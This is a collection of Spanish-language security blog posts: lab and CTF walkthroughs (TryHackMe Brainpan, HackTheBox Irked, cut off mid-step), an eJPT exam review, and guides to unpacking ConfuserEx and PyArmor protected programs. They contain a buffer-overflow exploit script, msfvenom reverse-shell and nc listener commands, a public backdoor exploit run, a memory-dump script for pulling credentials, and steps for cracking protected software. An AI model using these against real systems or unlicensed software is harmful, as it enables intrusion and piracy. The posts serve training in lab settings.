[{"content":"Comenzamos mirando que la máquina esté activa.\n1 2 3 4 5 6 7 ping -c1 10.10.173.74 PING 10.10.173.74 (10.10.173.74) 56(84) bytes of data. 64 bytes from 10.10.173.74: icmp_seq=1 ttl=63 time=47.3 ms --- 10.10.173.74 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 47.279/47.279/47.279/0.000 ms Realizamos un reconocimiento de puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 sudo nmap -sS --min-rate 5000 -p- -n -vvv 10.10.173.74 [sudo] contraseña para shadoow: Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:35 CEST Initiating Ping Scan at 14:35 Scanning 10.10.173.74 [4 ports] Completed Ping Scan at 14:35, 0.09s elapsed (1 total hosts) Initiating SYN Stealth Scan at 14:35 Scanning 10.10.173.74 [65535 ports] Discovered open port 10000/tcp on 10.10.173.74 Discovered open port 9999/tcp on 10.10.173.74 Completed SYN Stealth Scan at 14:36, 12.98s elapsed (65535 total ports) Nmap scan report for 10.10.173.74 Host is up, received echo-reply ttl 63 (0.047s latency). Scanned at 2023-05-27 14:35:54 CEST for 12s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 9999/tcp open abyss syn-ack ttl 63 10000/tcp open snet-sensor-mgmt syn-ack ttl 63 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.17 seconds Raw packets sent: 65648 (2.888MB) | Rcvd: 65591 (2.624MB) Con un escaneo mas exahustivo obtenemos mayor información.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 nmap -sCV -p9999,10000 10.10.173.74 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 14:37 CEST Nmap scan report for 10.10.173.74 Host is up (0.045s latency). PORT STATE SERVICE VERSION 9999/tcp open abyss? | fingerprint-strings: | NULL: | _| _| | _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| | _|_| _| _| _| _| _| _| _| _| _| _| _| | _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _| | [________________________ WELCOME TO BRAINPAN _________________________] |_ ENTER THE PASSWORD 10000/tcp open http SimpleHTTPServer 0.6 (Python 2.7.3) |_http-server-header: SimpleHTTP/0.6 Python/2.7.3 |_http-title: Site doesn\u0026#39;t have a title (text/html). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9999-TCP:V=7.93%I=7%D=5/27%Time=6471F981%P=x86_64-pc-linux-gnu%r(NU SF:LL,298,\u0026#34;_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\| SF:\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\ SF:x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\|\\x SF:20\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x SF:20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x SF:20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_\\| SF:\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x SF:20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x SF:20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20\\x SF:20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_ SF:\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x SF:20_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN\\x SF:20_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER\\x SF:20THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\u0026gt;\u0026gt;\\x20\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 39.52 seconds Nos fijamos en el puerto 10000 y hacemos fuzzing para encontrar rutas, en este caso hemos encontrado “/bin” , contiene un .exe por lo tanto nos le descargamos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 gobuster dir -u http://10.10.173.74:10000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,exe,py =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.173.74:10000 [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: php,html,txt,exe,py [+] Timeout: 10s =============================================================== 2023/05/27 14:41:31 Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 215] /bin (Status: 301) [Size: 0] [--\u0026gt; /bin/] Progress: 8852 / 1323366 (0.67%)^C [!] Keyboard interrupt detected, terminating. =============================================================== 2023/05/27 14:42:56 Finished =============================================================== Fuzzeamos para ver la cantidad de bytes que admite.\nCreamos un patrón con msf del tamaño de 600 bytes.\n1 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600 Lo aplicamos al script en la variable \u0026ldquo;payload\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #!/usr/bin/python import socket ip = \u0026#34;10.0.3.9\u0026#34; port = 9999 prefix = \u0026#34;brain \u0026#34; offset = 0 overflow = \u0026#34;A\u0026#34; * offset retn = \u0026#34;\u0026#34; padding = \u0026#34;\u0026#34; payload = \u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9\u0026#34; postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\u0026#34;Sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) print(\u0026#34;Done!\u0026#34;) except: print(\u0026#34;Could not connect.\u0026#34;) Con mona encontramos el offset del EIP.\n1 2 !mona findmsp -distance 600 EIP contains normal pattern : 0x33724132 (offset 518) Editamos el script.\n1 2 offset = 518 retn \u0026#34;BBBB\u0026#34; Como podemos ver el EIP ha cambiado su valor a “42424242” que es “BBBB”.\nBuscamos los bad characters.\n1 !mona bytearray -b \u0026#34;\\x00\u0026#34; ESP\u0026gt;FOLLOW IN DUMP, vemos que el único caracter que no usa es el 00.\nCon mona podemos ver que coincide con JMP ESP. (Salto)\n1 !mona modules por lo tanto los aplicamos a la variable \u0026ldquo;retn\u0026rdquo;.\n1 2 \u0026#34;\\xf3\\x12\\x17\\x31\u0026#34; añadimos también los NOPs en la variable padding \u0026#34;\\x90\u0026#34; * 16 Creamos un payload y lo pegamos en su variable, nos ponemos en esucha con nc.\n1 2 3 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.37.230 LPORT=4444 EXITFUNC=thread -b \u0026#34;\\x00\u0026#34; -f python nc -lvnp 4444 Root\n1 2 3 4 5 6 7 puck@brainpan:/home$ puck@brainpan:/home$ sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util Vemos que ejecutandolo nos permite poner en manual de cualquier binario , por lo tanto si llamamos al binario bash, y escrbimios !/bin/bash tendremos una shell de root.\n","date":"2023-05-29T00:00:00Z","image":"https://sx1v4n.github.io/p/brainpain-thm/logo.png","permalink":"https://sx1v4n.github.io/p/brainpain-thm/","title":"Write Up Brainpain"},{"content":"¡Hola a todos!, hace una semana hice el examen de eLearnSecurity y vengo a contaros mi experiencia en cuanto a dificultad y contenidos.\n¿Vale la pena? Si estás iniciándote el mundo del pentesting como yo, te diría que si, a mi me ha servido mucho, porque al ser el primer examen al que me presento iba con miedo debido a qué no sabia a que me enfrentaba y así ya me puedo ir haciendo una idea. Yo no hice el curso de INE, tengo hecha una considerable batería de máquinas de TryHackMe y HackTheBox , además de estar cursando un Bootcamp que me ha permitido adquirir los conocimientos correspondientes de redes, Linux y Windows. Por este motivo yo recomendaría hacer el curso para poder realizar el examen con éxito, ya que se dan temas importantes para dicha prueba, aunque para acelerar el proceso puedes omitir los módulos de programación, puesto que el examen no se centra demasiado en esa parte.\n¿Cómo definirías su dificultad? En mi opinión el examen me ha resultado fácil, pero hay que tener muy en cuenta la organización y saber enumerar muy bien, te puedes abrumar si no llevas una organización correcta. El examen tiene una duración de 48 horas y tienes tiempo de sobra para hacerle, por lo tanto no hay prisa , debes ir con calma y apuntando todo lo que ves, eso es lo más importante. El examen es en un navegador sin conexión, por lo tanto no puedes instalar herramientas.\n¿Qué repasar para ese momento? Los temas que puedes abarcar son los siguientes:\nIP route (con metasploit también) Wireshark Host Discovery Fuzzing Fuerza bruta Explotación Básica SQLi XSS Burpsuite Metasploit Redes Fundamentos Linux/Windows ¿Cómo es el examen? El examen está compuesto por 35 preguntas, 30 de ellas son tipo test, las demás suelen ser preguntas cortas que se responden a medida que se va haciendo el examen.\nTips No es un CTF, a mí me pasó varias veces y pensé en lo difícil, pero es mucho más fácil.\nBusca siempre dos formas de hacer las cosas para que no se te escape nada.\nSe puede usar cualquier herramienta automática, ya que no están prohibidas.\nMáquinas que pueden ser útiles para practicar: Vulnet Internal (THM) Game Zone (THM) ColddBox (THM) Cap (HTB) Validation (HTB) Wekor (Sin escalada) (THM) Blog (THM) ","date":"2023-05-13T00:00:00Z","image":"https://sx1v4n.github.io/p/ejptv2-review/ejptv2.jpg","permalink":"https://sx1v4n.github.io/p/ejptv2-review/","title":"eJPTv2 Review"},{"content":"Comenzamos mirando la ofuscación que tiene la aplicación.\nDejamos corriendo el ejecutable y abrimos un volcador de archivos para eliminar la protección de enigma.\nClick Derecho sobre la aplicación y elegimos la opción \u0026ldquo;Dump Selected Process\u0026rdquo;.\nNos crea una carpeta llamada \u0026ldquo;Dumps\u0026rdquo;, vamos a comprobar de nuevo la obfuscación con un detector, con de4dot nos indica que es confuser , pero vamos a hacer un escaneo más complejo para ver que es ConfuserEX.\nde4dot: Detect it easy: Ahora vamos abrir DnSpy para verlo de forma más profunda, como podemos observar está obfuscado por ConfuserEX. Debemos ir al módulo \u0026ldquo;main\u0026rdquo;.\nUna vez que hemos entrado en el módulo main debemos buscar la palabra \u0026ldquo;koi\u0026rdquo; (Es como un módulo que guarda toda la información sobre la aplicación en concreto), hacemos click sobre \u0026ldquo;LoadModule\u0026rdquo;.\nAñadimos un punto de ruptura en el método \u0026ldquo;return\u0026rdquo;.\nVolvemos a ir al .exe y inciamos la depuración.\nNos genera un modulo raw, lo guardamos con click derecho como .exe\nComo podemos ver se ha desempaquetado completamente.\nCracked: ","date":"2023-04-23T00:00:00Z","image":"https://sx1v4n.github.io/p/unpack-confuserex/logo.png","permalink":"https://sx1v4n.github.io/p/unpack-confuserex/","title":"Unpack ConfuserEx \u0026 Enigma"},{"content":"Comenzamos mirando que tipo de obfuscación lleva el archivo.\nUtilizamos la herramienta pyinstxtractor.\n1 2 3 4 5 6 7 8 9 10 11 12 python pyinstxtractor.py natif.exe [+] Processing natif.exe [+] Pyinstaller version: 2.1+ [+] Python version: 3.10 [+] Length of package: 873288 bytes [+] Found 9 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: natif.pyc [+] Found 97 files in PYZ archive [+] Successfully extracted pyinstaller archive: natif.exe Obtenemos una carpeta llamada \u0026ldquo;natif.exe_extracted\u0026rdquo;, podemos ver que tenemos un archivo .pyc que está compilado.\nUsaremos la herramienta pydc, Adjunto el repositorio y su instalación.\nRepositorio:\n1 https://github.com/zrax/pycdc Instalación:\n1 2 3 4 cd pycdc cmake . make make check Procedemos con su uso. Ya ha sido eliminada la obfuscación de pyinstaller, solo quedaría eliminar la de pyarmor.\n1 ./pycdc natif.pyc \u0026gt; natif.py Veamos como eliminamos esta protección.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 cat natif.py ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: natif.py ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ # Source Generated with Decompyle++ 2 │ # File: natif.pyc (Python 3.10) 3 │ 4 │ from pyarmor_runtime_000000 import __pyarmor__ 5 │ __pyarmor__(__name__, __file__, b\u0026#39;PY000000\\x00\\x03\\x0b\\x00\\xa7\\r\\r\\n\\x80\\x00\\x01\\x00\\x08\\x00\\x00\\x00\\x04\\x00\\x00\\x00@\\x00\\x00\\x00\\xde\\x02\\x00\\x00\\x12\\t\\x04\\x00\\xe8\\ │ x12\\x1be\\xac73Z\\x03\\xaf\\x19\\xa3\\xae\\x9f\\xa4z\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00F\\x97Ea\\xcc\\xa8 \\x7f\\x82g6\\\u0026#39;\\xd1\\x8dB=J\\x08?\\xe8/\\xdc\\x0b\\x10\\xb1\\x9f\\x9d\\xf4\\xf2j8\\xbeb │ \\xda\\x84\\xc7kE\\xed*J\\x08+\\xb4f\\xa4\\x7fU\\xdb|Z\\xbb?7f\\xd8\\xc5\\xd5\\xb6z9\\xf5\\xabq\\x83\\xbe\\xd1Wn\\x16\\x05\\x19\\xdb\\xbb\\xed\\xa3\\xcd@2\\xce\\xf5\\xfa\\xcapS`u\\xfe\\xd5\\x08cb\\xc │ 7a\\xa2\\x01\\xf7\\x99\\x80\\x8a{\\xe50\\xdf\\x9c\\xb7\\x10[:Yj\u0026amp;_\\x08|\\x86\\xbf\\x0b]G\\xf0KD\\xa8\\xd8/,\\x10,\\xa8M\\xfb\\xd3\\x9a9\\xd3\\xb1\\xce\\xca\\x91!h\\r\\x00\\x98\\xe9$\\x89\\xfe\\xdd\\x1 │ b\\x85b\\x9e\\xb7\\xb4\\xe9\\xee%\\xcf\\x95\\xa9\\x89+\u0026#34;}\\xdc\\xd7\\xa6u1\\x189\\x1c\\xbb\\xe1\\x8e\\x1b\\xbd\\xa6T\\xfb\\xc8\\x03\\xd2\\x86Z\\x1f\\x8f\\x8e:\\xe3\\xdcQ\\x19\\xca\\xbf)\\xbb\\xee\\x82O\\ │ x84\\x90a\\xaf\\x93\\xf8\\xd2\\x1e\\x1f\\xc1\\xa5\\x1cN\\x8b\\xbd\\xfa\\x01\\x977E\\xe2\\rJt\\x12@\\x8f\\xc1\\xe2\\x16l\\xcc\\x91R\\xb4\\x04]\\xc6\\xd0\\x0e\\x18\\x8ak\u0026#34;Y3\\x07|\\xfb\\xf5$\\xda\\x05\\xb │ 9\\x80h+\\xfei\\xf6\\x80\\xcb\\xe9\\x866\\x1f\\x98l\\xf8\\x88\\xe8\\x81u\\x9e\\xbe\\xf91]D\\xec\\xe2\\xba\\xba\\xeb\\xd1\\xfcqV\u0026amp;~G~\\xc0\\x98a\\xdc\\xaaN\u0026gt;\\x1aK\\xb86\\x1fT\\xdc\\xf2e\\x9e\\x1e\\x15\\ │ r\\xecc\\xc7o\\xb7\\xbc\\x86\\x13iM\\x15;\\xa4\\xed?\\x80\u0026amp;8p\\x81\\x1c\\xf3G)\\xe2\\xfd\\x82`Y\\x84\\xfdW\\x11\u0026#34;R\\xb2C\\xd8\\x17\\xcc\\xfc\\xda6\\xcf\\xe4\\x0b\\x16\\xdf\\x0e\\xe7F\\x04\\x1bsD\u0026amp;Q\\x93 │ \\x07\\x1d8L\\x7f\\t.\\x8b\\x87C\\xce\\x15e\\xa6TMZ\\x8d\\xa0\\xf9\\xcbl\\xf8\\xa8\\xa0\\xcb\\x1fs\\x9cP\\xff\\xcb\\xd7)\\x94\\x19\\xa3%\\x89\\x9c\\xd8\\x13\\xac\\xda@\\x10}\\xa8\\xf9[\\x17_\\xe5\\xe8\\ │ x9b\\x8bJ\\x0e\\x06y\\xac4A\\xc65*N\\x80\\xa2U\\xed\\x8c\\xf7\\x04R`\\xad7\\xc2J\\xe8\\xefv\\xfd\\xe3\\xd6^\\x9e\\xd5\\xdcW\\xe9Q7\\xa7\\xf4\\xc8\\xc7\\xa5\\xb7\\xfd\\x9fhE\\x8b \\x1dFz\\t\\x9d\\xfe\\ │ xb2j\\xef\\xca%\\xe2\\xe0\\x85+eF\\xafL\\x1c\\xee\\x0c\\xeal\\r\\x99\\x04d\\\\\\xc7\\xe6\\xa9\\xbc\\xefT\\x9a\\xdb\\xe9De\\x00\\xc9%\\t\\x08\\x82\\xe4\\x86\\xfb\\xe2\\xf9:\\x12\\xa4\\xe2\\xff\\xb6\\x93\\x │ dc\\x15\\x1c\\xc6c\\x15\\x97\\x0b\\xe5\\xe2\\xe9\\xac:Ns\\\\xg\\xc4B,\\x94\\xc3{:\\xcd\\xcf;q\\x9f\\x86\\xdfM\\x08U\\x9dLY}\\xcerH1\\x9e\\x0b\\xc5A\\xad\\xc1r)\\xdc\\xbf\\xb2Og.\\x0b\\xea\\xfd\\xc5\\x │ b6$Ez\\x1a\\x1d}w\\x99\\x1d\\xb4\\xec3\\x0c\\r]t\\xc4\\xde/\\x11\\x9c\\xbf*\\x01\\x1b\\x14\\xc2p:k\\xc2\\x168\\xa6$\\x85?Q[x\\x8b\\xccX\\xe3H\\xa7\\xd1\\xd7\\xf0)\\\\n_w\\x06X\\x049\\x92\\x06\\xee]\u0026gt;\\ │ x07\\x1f\u0026lt;\\x8f\\x0b\\x9f\\x1br\\xfc\\xbcQ\\x0c\\xefc\\x8b\\xe5\\xae\\xd3\\xe6u\\xd5#\\xc7\\x13\\x98\\x17\\x97|y\\xc8\\xb2\\xfe\\xd7osUzT\\xbf\\x87\\xcb\\xebe\\xcd\\x89\\x04[\\xc5\\xb7mA0e\\xbf\\xe8=\\ │ xfe\\xfc\\xb6O\\xc6\\x7fq\\x9d\\xbd\\xb1\\x9e\\xc4#\\xe4\\\\\\xb1\\x83\u0026#39;) Vamos a realizar un volcado de archivos con tal de obtener las credenciales.\nUtilizaremos un script llamado memdump.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #! /usr/bin/env python3 import sys import re if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 2: print(\u0026#39;Usage:\u0026#39;, sys.argv[0], \u0026#39;\u0026lt;process PID\u0026gt;\u0026#39;, file=sys.stderr) exit(1) pid = sys.argv[1] # maps contains the mapping of memory of a specific project map_file = f\u0026#34;/proc/{pid}/maps\u0026#34; mem_file = f\u0026#34;/proc/{pid}/mem\u0026#34; # output file out_file = f\u0026#39;{pid}.dump\u0026#39; # iterate over regions with open(map_file, \u0026#39;r\u0026#39;) as map_f, open(mem_file, \u0026#39;rb\u0026#39;, 0) as mem_f, open(out_file, \u0026#39;wb\u0026#39;) as out_f: for line in map_f.readlines(): # for each mapped region m = re.match(r\u0026#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])\u0026#39;, line) if m.group(3) == \u0026#39;r\u0026#39;: # readable region start = int(m.group(1), 16) end = int(m.group(2), 16) mem_f.seek(start) # seek to region start print(hex(start), \u0026#39;-\u0026#39;, hex(end)) try: chunk = mem_f.read(end - start) # read region contents out_f.write(chunk) # dump contents to standard output except OSError: print(hex(start), \u0026#39;-\u0026#39;, hex(end), \u0026#39;[error,skipped]\u0026#39;, file=sys.stderr) continue print(f\u0026#39;Memory dump saved to {out_file}\u0026#39;) Iniciamos el proceso y lo dejamos ejecutando.\n1 python3 natif.py Mientras tanto veremos lo procesos. Es muy importante poner ese parámetro para poder ver los procesos padres y los hijos, nos fijamos en el segundo que es el PID.\n1 ps -axjf Ahora vamos a realizar el volcado.\n1 python3 memdump.py \u0026lt;Number_PID\u0026gt; Debemos utilizar strings para poder extraer los datos legibles.\n1 strings \u0026lt;proceso.dump\u0026gt; \u0026gt; \u0026lt;proceso_legible.dump\u0026gt; Resultado:\n1 2 3 4 python3 natif.py User: NatifLoop Password: Py4RmOrDeObfSCati0n Great! ","date":"2023-04-16T00:00:00Z","image":"https://sx1v4n.github.io/p/unpack-pyarmor/logo.png","permalink":"https://sx1v4n.github.io/p/unpack-pyarmor/","title":"Unpack Pyarmor \u0026 Pyinstaller"},{"content":"Resolución de la Máquina Irked de HackTheBox. Comprobamos que la máquina esta activa.\n1 2 3 4 5 6 7 ping -c 1 10.10.10.117 PING 10.10.10.117 (10.10.10.117) 56(84) bytes of data. 64 bytes from 10.10.10.117: icmp_seq=1 ttl=63 time=43.0 ms --- 10.10.10.117 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 42.976/42.976/42.976/0.000 ms Seguido de esto, hacemos un reconocimiento de los puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 sudo nmap -sS --min-rate 5000 -p- -vvv -n 10.10.10.117 [sudo] contraseña para iv4n: Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 12:51 CET Initiating Ping Scan at 12:51 Scanning 10.10.10.117 [4 ports] Completed Ping Scan at 12:51, 0.09s elapsed (1 total hosts) Initiating SYN Stealth Scan at 12:51 Scanning 10.10.10.117 [65535 ports] Discovered open port 80/tcp on 10.10.10.117 Discovered open port 111/tcp on 10.10.10.117 Discovered open port 22/tcp on 10.10.10.117 Discovered open port 65534/tcp on 10.10.10.117 Discovered open port 57598/tcp on 10.10.10.117 Discovered open port 8067/tcp on 10.10.10.117 Discovered open port 6697/tcp on 10.10.10.117 Increasing send delay for 10.10.10.117 from 0 to 5 due to max_successful_tryno increase to 4 Increasing send delay for 10.10.10.117 from 5 to 10 due to max_successful_tryno increase to 5 Completed SYN Stealth Scan at 12:51, 12.42s elapsed (65535 total ports) Nmap scan report for 10.10.10.117 Host is up, received echo-reply ttl 63 (0.091s latency). Scanned at 2023-03-08 12:51:06 CET for 13s Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 111/tcp open rpcbind syn-ack ttl 63 6697/tcp open ircs-u syn-ack ttl 63 8067/tcp open infi-async syn-ack ttl 63 57598/tcp open unknown syn-ack ttl 63 65534/tcp open unknown syn-ack ttl 63 Hacemos un escaneo más profundo con -sC -sV o bien -sCV. Nos fijamos en el puerto 6697.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 nmap -sCV -p22,80,111,6697,8607,57598,65534 10.10.10.117 255 ↵ Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-08 12:52 CET Nmap scan report for 10.10.10.117 Host is up (0.079s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0) | ssh-hostkey: | 1024 6a5df5bdcf8378b675319bdc79c5fdad (DSA) | 2048 752e66bfb93cccf77e848a8bf0810233 (RSA) | 256 c8a3a25e349ac49b9053f750bfea253b (ECDSA) |_ 256 8d1b43c7d01a4c05cf82edc10163a20c (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.10 (Debian) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100024 1 50971/tcp6 status | 100024 1 57598/tcp status | 100024 1 58593/udp status |_ 100024 1 60397/udp6 status 6697/tcp open irc UnrealIRCd 8607/tcp closed unknown 57598/tcp open status 1 (RPC #100024) 65534/tcp open irc UnrealIRCd Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Podemos explotar \u0026lsquo;\u0026lsquo;UnrealIRCd\u0026rsquo;\u0026rsquo; por lo tanto buscamos un exploit válido. La versión no la conocemos por lo tanto vamos a probar, ya que no tenemos nada que perder.\n1 https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor Le clonamos con git clone y le ejecutamos.\n1 2 3 4 5 6 7 8 9 10 11 git clone https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor cd UnrealIRCd-3.2.8.1-Backdoor con nano o vim debemos editarlo y cambiar estos dos parámetros. local_ip = \u0026#39;your ip\u0026#39; # CHANGE THIS local_port = \u0026#39;your nc port\u0026#39; # CHANGE THIS nc -lvnp 4443 python3 exploit.py -payload bash 10.10.10.117 6697 Tenemos acceso.\n1 2 3 ircd@irked:~/Unreal3.2$ whoami whoami ircd Buscamos en el usuario djmardov, encontramos un archivo llamado .backup, podria ser la clave para la fotografía inicial de la página, por lo tanto la descargamos.\n1 2 